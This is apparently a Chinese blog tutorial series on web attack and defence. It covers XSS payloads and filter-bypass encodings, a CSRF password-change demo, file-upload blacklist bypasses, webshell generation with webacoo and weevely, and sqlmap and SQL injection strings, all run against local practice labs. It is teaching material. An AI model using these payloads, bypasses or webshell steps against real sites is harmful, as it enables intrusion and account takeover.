![Chrome配置--args --disable-xss-auditor](https://img-blog.csdnimg.cn/20200313141150891.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 5.属性中的XSS发现

技巧：
**ctrl+f**全局搜索内容；
闭合引号，尖括号，引入script脚本，例如：

```javascript
123"><script>alert(document.domain);</script>
1
```

**onmouseover**事件指定鼠标悬停弹出，例如：

```javascript
" onmouseover=alert(document.domain)>
1
```

测试如下：
![XSS attack attribute test](https://img-blog.csdnimg.cn/20200313143032782.gif#pic_center)

# Python全栈（五）Web安全攻防之9.XSS攻击（下）

## 一、下拉框select和input的XSS攻击

### 1.属性中的XSS发现–下拉框select

select元素可创建单选或多选菜单，如下：

```markup
<select name="p2">
    <option>Japan</option>
    <option>Germany</option>
    <option>USA</option>
    <option>United Kingdom</option>
</select>
123456
```

在select下拉框中输入`</option>`闭合标签：

```markup
Japan</option><script>alert(document.domain);</script>
1
```

测试如下：
![XSS attribute select test](https://img-blog.csdnimg.cn/20200317131531104.gif)

### 2.HTML表单input属性

input标签的属性有：

- value
  输入字段的初始值

- readonly
  输入字段为只读(不能修改)

- disabled
  输入字段是禁用的

- size
  规定输入字段的字符

- maxlength
  输入字段允许最大长度

- type

  类型

  - text文本
  - password密码
  - hidden隐藏

### 3.HTML表单隐藏参数

隐藏域是用来收集或发送信息的**不可见元素**，对于网页的访问者来说，隐藏域是看不见的；
当表单被提交时，隐藏域就会将信息（定义的名称和值）发送到服务器上。
测试时，如果用之前的方法可能会失效，改变页面元素提交后会恢复原状，这时需要将input表单的类型由**hidden**改为**text**，再进行测试：
![XSS attribute hidden test](https://img-blog.csdnimg.cn/20200317131559510.gif)

## 二、input属性和HTML事件触发XSS

### 1.修改maxlength的值达到XSS攻击效果

如果不修改maxlength的值，可能payload不能填完，因此需要先修改，再加入`"><script>alert(document.domain);</script>`测试。
测试如下：
![XSS attribute maxlength test](https://img-blog.csdnimg.cn/20200317131620364.gif)

### 2.通过HTML事件来触发XSS

HTML事件的介绍可参考http://www.w3school.com.cn/tags/html_ref_eventattributes.asp，HTML实体的介绍可参考https://www.w3school.com.cn/html/html_entities.asp。
通过事件来触发XSS的原理是通过添加双引号闭合来增加标签属性，如下：

```javascript
" οnmοuseοver="alert(document.domain)

" οnclick="alert(document.domain)
123
```

测试如下：
![XSS attribute event test](https://img-blog.csdnimg.cn/20200317131652341.gif)
注意：
必须增加**两个双引号**，形成两个闭合。

### 3.空格分隔属性中的XSS

用闭合引号的思路来进行尝试：

```javascript
" οnmοuseοver= "alert(document.domain)
1
```

测试如下：
![XSS attribute space test](https://img-blog.csdnimg.cn/20200317131709255.gif)

## 三、javascript伪协议和绕过注释domain

### 1.利用javascript伪协议触发XSS

将javascript代码添加到客户端的方法是把它放置在伪协议说明符`javascript:`后的URL中。
这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。
如果`javascript:URL`中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。
例如：

```javascript
javascript:var now = new Date(); "<h1>The time is:</h1>" + now;
1
```

**javascript URL**还可以含有只执行动作，但不返回值的javascript语句，如下：

```javascript
javascript:alert("hello world!")
1
```

**a标签**：
定义超链接，用于从一个页面链接到另外一个页面；
标签最重要的属性是**href**属性，它指定链接的目标。

在所有浏览器中，链接的默认外观是：
未被访问的链接带有下划线而且是蓝色的；
已被访问的链接带有下划线而且是紫色的；
活动链接带有下划线而且是红色的。
测试如下：
![XSS javascript test](https://img-blog.csdnimg.cn/20200317131742380.gif)

### 2.绕过注释domain

**跳过Stage**：
构造特殊无害字符串，响应中寻找字符串；
在span标签中添加`onclick= "alert(document.domain)"`。
绕过方法有双写和编码2种。

#### 双写绕过

```javascript
"><script>alert(document.dodomainmain);</script>
1
```

测试如下：
![XSS domain doublewrite test](https://img-blog.csdnimg.cn/20200317131801159.gif)

#### 编码绕过

`alert(document.domain)`的base64编码是`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`，用`eval()`函数执行JavaScript代码，`atob()`函数解码base64字符串。

```javascript
"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>
1
```

测试如下：
![XSS domain base64 test](https://img-blog.csdnimg.cn/20200317131816394.gif)

## 四、XSS绕过和利用IE触发CSS

### 1.绕过替换script和on事件的XSS

HTML十进制编码可参考https://blog.csdn.net/HappyRocking/article/details/79744049。
**tab制表符**的html十进制编码`	`。
将HTML十进制编码的tab制表符加入JS代码中：

```javascript
"><a href="javascr&#09ipt:alert(document.domain);">xss</a>
1
```

测试如下：
![XSS tab dec test](https://img-blog.csdnimg.cn/20200317131844289.gif)

### 2.利用IE特性绕过XSS过滤

IE中两个反引号``可以闭合一个左边双引号，即" `` 可以实现闭合，如

```javascript
``onclick=alert(document.domain)
1
```

这个只适用于IE浏览器。
测试如下：
![XSS IE `` test ](https://img-blog.csdnimg.cn/20200317131906617.gif)

### 3.利用CSS特性绕过XSS过滤

CSS（层叠样式表）是一种用来表现HTML或XML等文件样式的计算机语言，可以修饰页面效果。

将JS代码加入CSS中：

```javascript
background:url("javascript:alert(document.domain);");
1
```

**IETester**是一个免费的（个人和专业用途的）WebBrowser，可以在Windows 8台式机，Windows 7，Vista和XP上使用IE11，IE10，IE9，IE8，IE7，IE 6和IE5.5的呈现和JavaScript引擎，以及在同一过程中安装的IE。
在**IETester**（点击https://download.csdn.net/download/CUFEECR/12253066或官网https://www.my-debugbar.com/wiki/IETester/HomePage下载安装）中进行测试，因为各个版本的IE都需要进行测试，Windows10里面自带的IE不会执行。
测试如下：
![XSS CSS background test](https://img-blog.csdnimg.cn/20200317131934906.gif)

### 4.IE中利用CSS触发XSS

**css expression**（css表达式）又称**Dynamic properties**（动态属性）是早期微软DHTML的产物，以其可以在Css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题。
微软从IE8 beta2标准模式开始，取消对css expression的支持。
IE5及其以后版本支持在CSS中使用expression，用来把CSS属性和Javascript表达式关联起来。
expression举例如下：

```javascript
here:expres/\*\*/sion(if(!window.x){alert(document.domain);window.x=1;}); 

here:e\\0xpression(onmouseover=function(){alert(document.domain)})
123
```

测试如下：
![XSS IE css test](https://img-blog.csdnimg.cn/20200317131956883.gif)

## 五、通过编码转码符号绕过XSS过滤

### 1.16进制绕过过滤触发XSS

十六进制转换每一位上可以是从小到大为0、1、2、3、4、5、6、7、8、9、A、B、C、D、E和F16个大小不同的数，即逢16进1，其中A、B、C、D、E、F(字母不区分大小写)六个字母来分别表示10、11、12、13、14、15。
Python实现16进制转换：

```python
import binascii 

s = binascii.b2a_hex(">" .encode("utf8")) 
print(s.decode()) 
print("\\x"+s.decode())
12345
```

打印

```python
3e
\x3e
12
```

<script>alert(document.domain)</script>将**>和<**替换为16进制后：

```javascript
\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
1
```

测试如下：
![XSS hex test](https://img-blog.csdnimg.cn/20200317132036937.gif)

### 2.unicode绕过过滤触发XSS

Unicode(万国码、国际码、统一码、单一码)是计算机科学领域里的一项业界标准，它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。
Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种中的每个字符设定了统一并且唯一的二进制编码，满足跨语言、跨平台进行文本转换、处理的要求。
使用Python将字符串转换为unicode类型：

```python
import binascii


def s2unicode(s):
    stemp = binascii.b2a_hex(s.encode("utf8"))
    return "\\u00" + stemp.decode()


print('%sscript%salert(document.domain)%s/script%s' % (s2unicode('<'), s2unicode('>'), s2unicode('<'), s2unicode('>')))

12345678910
```

打印：

```python
\u003cscript\u003ealert(document.domain)\u003c/script\u003e
1
```

使用`\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e`测试如下：
![XSS Unicode test](https://img-blog.csdnimg.cn/20200317132057550.gif)

# Python全栈（五）Web安全攻防之10.CSRF和文件上传

## 一、存储型XSS测试

### 1.环境搭建

可点击https://download.csdn.net/download/CUFEECR/12255996下载测试环境。
下载之后解压并拷贝到PHPStudy的根目录下的**WWW**目录下，再访问http://127.0.0.1/pconline/，会出现：
![access pcline forbidden](https://img-blog.csdnimg.cn/20200319144932497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
需要进行安装配置：
（1)如果未勾选**php_pdo_mysql**，需要手动勾选，如下：
![php pdo mysql](https://img-blog.csdnimg.cn/20200319144953361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
（2）设置允许目录列表访问如下：
![php allow listaccess](https://img-blog.csdnimg.cn/20200319145053391.gif)
（3）修改pconline目录下的app目录下的config目录下的**db_config.php**：
密码行密码改为root，如下：
![pconline dbconfig password](https://img-blog.csdnimg.cn/20200319145139624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
保存，同时获取到数据库名为**rocboss_2_1**。
（4）使用数据库管理工具如sqlyog等创建数据库并执行pconline目录下的**install.sql**文件中的SQL语句，演示如下：
![pconline dbconfig rocboss_2_1](https://img-blog.csdnimg.cn/20200319145219373.gif)
此时再访问，会显示：
![pconline normal  access](https://img-blog.csdnimg.cn/20200319145241432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
此时即可正常访问。
用默认账号**admin**和密码**123456**进行登录即可。

### 2.定向挖掘XSS漏洞

XSS漏洞可以存在于个人资料处、文章发表处或留言评论处。
对搜索和发帖进行测试，如下：
![pconline search  release test](https://img-blog.csdnimg.cn/20200319145322627.gif)
显然，只有发帖的添加标签可触发反射型XSS。

#### 黑名单审计

私信位置没有被实体化，可以进行XSS，但是会被黑名单过滤。
查看**system\util\Filter.php**文件如下：

```javascript
$ra1 = Array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'base', 'style'); 

$ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');        
123
```

显然，没有过滤**details**和**ontaggle**，可以利用其进行测试。
payload如下：

```javascript
"><details open οntοggle=eval("\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert('xss')")><"
1
```

绕过进行测试，在标签中添加payload和互相私信时发送payload会成功触发XSS，如下：
![pconline xss bypass test](https://img-blog.csdnimg.cn/20200319145407355.gif)

#### Kali中XSSer的使用

XSSer是Kali中XSS的自动化探测漏洞和挖掘工具，简单的使用和测试如下：



<iframe id="gPfdrbYE-1584602210009" src="https://player.youku.com/embed/XNDU5NDM0NjI4MA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

pconline kali xsser test



## 二、CSRF原理介绍

### 1.CSRF漏洞定义

**CSRF**(cross-site request forery，**跨站请求伪造**)，也被称为**one click attack**或者session riding，通过缩写为CSRF或者XSRF。

#### XSS与CSRF区别

- XSS**利用**站点内的信任用户，盗取cookie
- CSRF通过**伪装**成受信任用户请求信任的网站

### 2.CSRF漏洞原理

利用目标用户的合法身份，以目标用户的名字执行某些非法操作。
举例：
正常用户转账的链接为http://www.xxx.com/pay.php?user=xx&money=100，则恶意用户转账链接可能为
http://www.xxx.com/pay.php?user=恶意用户&money=1000。

### 3.CSRF漏洞利用

在修改密码的时候，抓包抓到修改密码的请求http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change，GET型CSRF请求的链接形如http://127.0.0.1/csrf/csrf_get.php?username=admin&password=admin。
进行测试：
![pconline csrf test](https://img-blog.csdnimg.cn/20200319151811192.gif)
显然，将安全级别增加到**impossible**之后，在请求的链接后多了一个参数**user_token**，用来唯一识别用户，并且每次请求都会产生不同的token，如果在站外访问链接是达不到修改密码的目的的，从而保证了安全性。当然，如果安全级别是**low**的时候，在站外访问请求链接可以达到修改密码的目的。
将安全级别设为low，写一个简单的模拟中奖的html脚本，其中一个元素为图片，放入修改密码的链接，打开该html，在打开请求图片链接的时候即请求修改密码。修改成功，再用默认密码password登录便不能成功，需要使用改过之后的密码进行登录，演示如下：
![pconline csrf password test](https://img-blog.csdnimg.cn/20200319151901156.gif)
在很多网页中出现的提示中奖等具有诱导性的链接中即使用了这个原理，只要你点击链接，便会在无意中修改自己的密码，被别人盗用还浑然不知。

### 4.CSRF防御措施

CSRF的漏洞实质是服务器无法准确判断当前请求**是否是合法用户**的自定义操作。
预防措施有：

- 验证码防御
- referer check防御

## 三、文件上传

### 1.环境搭建

可点击https://download.csdn.net/download/CUFEECR/12256008下载靶场环境。
下载完成后解压拷贝到PHPStudy的根目录下的**WWW**目录下，并在upload-labs目录下手动创建一个文件夹**upload**。
进行测试如下：
![pconline upload test1](https://img-blog.csdnimg.cn/20200319151956650.gif)
显然，上传的文件只能是图片，并且上传的文件自动保存到之前创建的upload目录中。
这主要是因为页面中有JS进行文件验证：
![fileupload withJS](https://img-blog.csdnimg.cn/20200319152056718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

### 2.绕过JS验证

#### 方式一：burpsuite剔除响应JS

对于JS前端验证，直接删除掉JS代码之后就可以绕过JS验证。
BURPSUITE绕过测试：



<iframe id="UVLKUuRb-1584602504097" src="https://player.youku.com/embed/XNDU5NDM0ODY2NA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload JS burpsuite



显然，BURPSUITE去除了页面中的所有JS，如下：
![fileupload noJS](https://img-blog.csdnimg.cn/20200319152159951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

#### 方式二：浏览器审计工具剔除JS

利用浏览器的审查工具剔除JS之后，保存为新文件然后进行文件上传。
修改网页代码实现表单提交测试如下：
![fileupload JS newhtml](https://img-blog.csdnimg.cn/20200319152221606.gif)

### 3.绕过MIME-Type验证

#### MIME-Type介绍

**MIME**（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型），是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。
多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。
常见的MIME类型可查看https://www.cnblogs.com/korea/p/11787460.html。

#### 绕过MIME-Type测试

利用Burpsuite工具截断HTTP请求，修改MIME-Type类型绕过验证。
测试如下：



<iframe id="1H9TldhM-1584602630357" src="https://player.youku.com/embed/XNDU5NDM1MDcwMA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload mimetype test



### 4.绕过黑名单

对于文件上传模块来说，尽量避免上传可执行的脚本文件。为了防止上传脚本需要设置对应的验证方式。最简单的就是**设置文件后缀名验证**。
基于文件后缀名验证方式的分类：

- 基于白名单验证：
  只针对白名单中有的后缀名，文件才能上传成功。
- 基于黑名单验证：
  只针对黑名单中没有的后缀名，文件才能上传成功。

对于黑名单中的后缀名筛选，绕过黑名单可以通过寻找**漏网之鱼**，寻找某些可以被作为脚本执行同时也不在黑名单中的文件。
利用Burpsuite工具截断HTTP请求，利用**Intruder**模块进行枚举后缀名，寻找黑名单中没有过滤的后缀名。
测试如下：



<iframe id="ce9wjFDL-1584602709163" src="https://player.youku.com/embed/XNDU5NDM1MjEwNA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload blacklist test



显然，.php文件不能上传，而其他格式的文件如.py、.php1、.php2、.php3和.php4格式的文件能成功上传，即.php文件在黑名单中。

### 5.绕过黑名单验证(大小写验证)

大小写绕过原理：
Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的；
Linux系统下，对于文件名中的大小写敏感。例如：test.php和 TesT.php就是不一样的。
只存在于Windows当中，不存在于Linux系统。
在Windows中测试如下：
![fileupload blacklist case Windows test](https://img-blog.csdnimg.cn/20200319152608295.gif)
在Kali中测试如下：
![fileupload blacklist case  Kali test](https://img-blog.csdnimg.cn/2020031915275321.gif)

### 6.Webacoo上传Webshell

使用webacoo上传webshell的步骤如下：

- WeBaCoo生成Webshell
  `webacoo -g -o a.php`
- 上传Webshell
- 连接Webshell
  `webacoo -t -u Webshell地址`

测试如下：



<iframe id="UFPvRPvv-1584602904948" src="https://player.youku.com/embed/XNDU5NDM1MzgwOA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload webshell webacoo test



显然，当上传a.php后可以对目标服务器目录进行操作。

### 7.绕过黑名单验证(空格验证)

空格绕过原理：
Windows系统下，对于文件名中空格会被作为空处理，程序中的检测代码却不能自动删除空格，从而绕过黑名单。
针对这样的情况需要使用Burpsuite截断HTTP请求之后，修改对应的文件名添加空格。
测试如下：
![fileupload blacklist space test](https://img-blog.csdnimg.cn/20200319152851915.gif)

### 8.绕过黑名单验证(英文句号.绕过)

句号绕过原理：
Windows系统下，文件后缀名最后一个点会被自动去除。
利用Burpsuite工具截断HTTP请求，上传文件加 **.** 绕过上传。
测试如下：
![fileupload blacklist period test](https://img-blog.csdnimg.cn/20200319152921677.gif)

### 9.使用weevely生成Webshell并上传

使用weevely上传Webshell：

- 生成Webshell
  `weevely generate 密码 路径/文件名`
- 上传Webshell
- 连接Webshell
  `weevely shell文件地址 密码`

测试如下：



<iframe id="bzsCAJV8-1584603017598" src="https://player.youku.com/embed/XNDU5NDM1Njg0NA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload webshell weevely test



显然，weevely比webacoo的功能稍强大一点。

### 10.绕过黑名单验证(路径拼接绕过)

路径拼接绕过原理：
在没有对上传的文件进行重命名的情况下，用户可以自定义文件名并在服务器中上传新建，就会造成对应的绕过黑名单。
在BURPSUITE中修改文件名，再上传**1.php. .** 文件。
测试如下：



<iframe id="77IJ3MaI-1584603046797" src="https://player.youku.com/embed/XNDU5NDM1NDk3Ng==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

fileupload path test



### 11.绕过黑名单验证(双写绕过)

双写绕过原理：
代码编写过程中，只对黑名单中的内容进行空替换，因为只替换一次所以造成双写绕过。
在BURPSUITE中修改文件名，如**1.phphpp**。
测试如下：
![fileupload doublewrite test](https://img-blog.csdnimg.cn/20200319153141203.gif)
显然，如果后缀名只有一个php，会从文件名中去除，成为一个没有后缀名的文件，所以必须双写才可以绕过。

# Python全栈（五）Web安全攻防之11.Web安全攻防小结

## 一、信息收集

### 1. 域名

用whois工具收集。
子域名收集工具包括：

- maltegoce
- 浏览器
  - 如站长之家
- wydomain

### 2.端口

#### 常见端口

- 21
- 80
- 443
- 3306
- 3389（远程端口）
- 6379（Redis端口）

#### 探测工具

**nmap**
使用命令：

```powershell
nmap -A -v -t4 target
1
```

### 3.敏感信息收集

Google Hacking语法：

- `site:域名`
  根据域名搜索
- `intext:关键字`
  根据关键字搜索
- `intitle:标题关键字`
  根据标题中的关键字搜索
- `inurl:地址`
  搜索包含关键字的url

### 4.真实IP地址

如果存在CDN（内容分发网络），不容易探测到真实IP地址，需要绕过，可以通过ping进行测试。

### 5.shodan

shodan是特殊浏览器，搜索服务器、摄像头、路由器。
使用前需要先注册，获得**API Key**以便在命令行和Python等中使用。

#### 浏览器中的常见用法：

- webcam
  搜索摄像头。
- port
  搜索端口。
- host
  搜索地址。
- city
  搜索城市。

#### 命令行中使用：

- pip安装
- 初始化

```powershell
shodan init api_key
1
```

- 搜索

#### Python中的使用

- 初始化
- 搜索

## 二、sqlmap的参数

先下载，解压即可使用。

### 1.target

- -u
- -d
- -m
- -r
- -c

### 2.request

- –method
- –data
- –cookie
- –user-agent
- –referer
- –proxy
- –delay
- –time-out
- –retries
- –randomize
  随机参数
- –safe-url
  每请求几次，会进行一些正常的请求。

### 3.Optimization

- –keep-alive
  保持长连接
- –null-connection
  空连接
- threads
  线程。

### 4.Injection

- –skip
  跳过
- –dbms
- –os
- –predix
  前缀
- –suffix
  后缀

### 5.Technique

- –technique
- –union-cols
- –union-char
- –union-from

### 6.Enumeration

- -b
- –dbs
- –dump
- -D
- –where
- –start
- –stop

### 7.Sqlmap练习

测试环境为墨者学院在线靶场，演示如下：



<iframe id="4T0EDnuG-1585120577711" src="https://player.youku.com/embed/XNDYwMzkwNjY4NA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

墨者学院sqlmap布尔盲注测试



## 三、SQL注入

### 1.前提条件

- 参数可控
- 参数与数据库有交互

### 2.分类

#### 根据数据类型

- 字符串
- 整数

#### 根据返回结果

- 显错注入
- 盲注
  - 时间盲注
  - 布尔盲注

### 3.GET报错的注入

- 探测是否有注入点
- 通过order by判断字段数
- 通过union select获取表名
- 通过系统表查询字段
- 获取字段值

### 4.GET基于时间的盲注

举例：

```sql
if(ascii(substr(database(),1,1))=115,1,sleep(3))
1
```

看页面是否有延迟。

### 5.GET基于布尔的盲注

举例：

```sql
select ascii(substr(database(),1,1)) = N; 
1
```

### 6.POST报错的注入

原理：
闭合引号。

### 7.SQL注入绕过手段

- 双写
- 大小写
- 编码
- MySQL内联注释
- 闭合引号
  - `' or 1=1`
  - `' or '1'='1`

### 8.SQL手动注入测试

测试环境为墨者学院在线靶场，测试如下：



<iframe id="WWh3WpDj-1585120666068" src="https://player.youku.com/embed/XNDYwMzkwOTA0MA==" allowfullscreen="true" data-mediaembed="youku" style="box-sizing: border-box; outline: 0px; margin: 0px; padding: 0px; font-weight: normal; font-family: &quot;Microsoft YaHei&quot;, &quot;SF Pro Display&quot;, Roboto, Noto, Arial, &quot;PingFang SC&quot;, sans-serif; overflow-wrap: break-word; display: block; width: 660px; height: 330px;"></iframe>

墨者学院手动SQL注入测试



## 四、XSS跨站脚本

### 1.分类

- 反射型
  非持久性攻击
- 存储型
  持久性攻击
- DOM型
  服务器不会处理响应。

### 2.payload

- `<script>alert(document.domain);</script>`
- `123"> <script>alert(document.domain);</script>`
- `"</b><script>alert(document.domain);</script>`
- `" onmouseover=alert(document.domain)`
- javascript伪协议
  `javascript:alert(123)`
- CSS特性

```javascript
background:url("javascript:alert(document.domain);");
1
```

- 表单隐藏域

```markup
type=hidden
1
```

- 实体双写
- base64编码
- 16进制编码
- Unicode编码
- IE浏览器特性

## 五、文件上传

常见的绕过验证的方式如下：

- 绕过JS验证
  - BurpSuite去除JS
  - 浏览器去除JS代码并保存，在保存后的HTML页面提交
- MIME-Type
  修改文件类型
- 修改文件后缀
- 大小写
- 双写
- 路径拼接